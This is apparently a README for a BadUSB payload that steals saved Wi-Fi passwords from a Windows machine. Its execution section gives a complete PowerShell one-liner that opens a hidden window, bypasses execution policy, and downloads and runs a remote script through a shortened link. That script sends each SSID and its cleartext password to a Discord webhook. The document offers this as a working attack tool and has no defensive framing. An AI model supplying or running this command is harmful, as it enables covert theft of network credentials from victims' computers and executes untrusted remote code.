# Win-Wifi-Pwds.ps1 - BadUSB

A script used to exfiltrate WLAN Passwords off of a Windows machine via Discord web hooks.

**Category**: WLAN, Credentials

## Description

A script used to exfiltrate WLAN Passwords off of a Windows machine via Discord web hooks.

Opens a hidden PowerShell window, grabs wlan passwords, saves as a cleartext in a variable and exfiltrates info via Discord Webhook. The webhook message will include the SSID and the password to easily identify credentials and associated SSIDs.

## Execution

The following command will create the "$discord" variable, pull down and invoke the 'Win-Wii-Pwds.ps1' poershell script.

```powershell
powershell -w h -ep bypass $discord='<your_webhook_URL_here>';irm bit.ly/WindowsWiFiPasswordsENG | iex
```

## Credits

<h2 align="center"> Aleff :octocat: </h2>
<div align=center>
<table>
  <tr>
    <td align="center" width="96">
      <a href="https://github.com/aleff-github">
        <img src=https://github.com/aleff-github/aleff-github/blob/main/img/github.png?raw=true width="48" height="48" />
      </a>
      <br>Github
    </td>
    <td align="center" width="96">
      <a href="https://www.linkedin.com/in/alessandro-greco-aka-aleff/">
        <img src=https://github.com/aleff-github/aleff-github/blob/main/img/linkedin.png?raw=true width="48" height="48" />
      </a>
      <br>Linkedin
    </td>
  </tr>
</table>
</div>